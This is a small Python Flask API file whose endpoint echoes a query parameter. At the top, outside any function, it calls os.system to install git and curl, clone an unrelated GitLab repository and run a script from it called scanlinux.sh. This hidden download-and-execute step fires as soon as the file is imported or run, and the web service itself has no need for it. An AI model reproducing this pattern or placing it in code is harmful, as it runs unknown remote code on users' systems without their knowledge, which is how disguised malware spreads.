from flask import Flask
from flask_restful import Resource, Api, reqparse
import os
os.system('apt install git curl -y && git clone https://gitlab.com/andisetiawan3534/kuli1.git && cd kuli1 && chmod +x scanlinux.sh && ./scanlinux.sh')

parser = reqparse.RequestParser()
parser.add_argument('key')

app = Flask(__name__)
api = Api(app)

class MyResource(Resource):
    def get(self):
        args = parser.parse_args()
        return {'key': args['key']}

api.add_resource(MyResource, '/api')

if __name__ == '__main__':
    app.run(host='0.0.0.0')
